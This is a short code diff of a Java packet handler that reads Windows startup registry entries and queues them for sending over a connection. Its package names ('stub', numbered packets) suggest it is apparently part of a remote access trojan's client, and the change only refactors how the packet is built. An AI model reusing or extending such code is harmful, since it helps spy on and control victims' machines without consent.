@@ -5,7 +5,8 @@ import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet53RegistryStartup;
 
 
 public class PacketLISTSTARTUP extends AbstractIncomingPacket {
@@ -21,20 +22,15 @@ public class PacketLISTSTARTUP extends AbstractIncomingPacket {
 				
 				while ((line = reader.readLine()) != null) {
 					String[] args = line.trim().split("    ");
-					PacketBuilder packet = new PacketBuilder(Header.REGISTRY_STARTUP);
-					packet.add(args.length);
-					for (String str : args) {
-						packet.add(str);
-					}
-					Connection.addToSendQueue(packet);
+
+					Connection.addToSendQueue(new Packet53RegistryStartup(args));
 				}
 				reader.close();
 			} else {
 				throw new Exception("Windows only");
 			}
 		} catch (Exception ex) {
-			PacketBuilder packet = new PacketBuilder(Header.REGISTRY_STARTUP, "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
-			Connection.addToSendQueue(packet);
+			Connection.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 		}
 	}
 
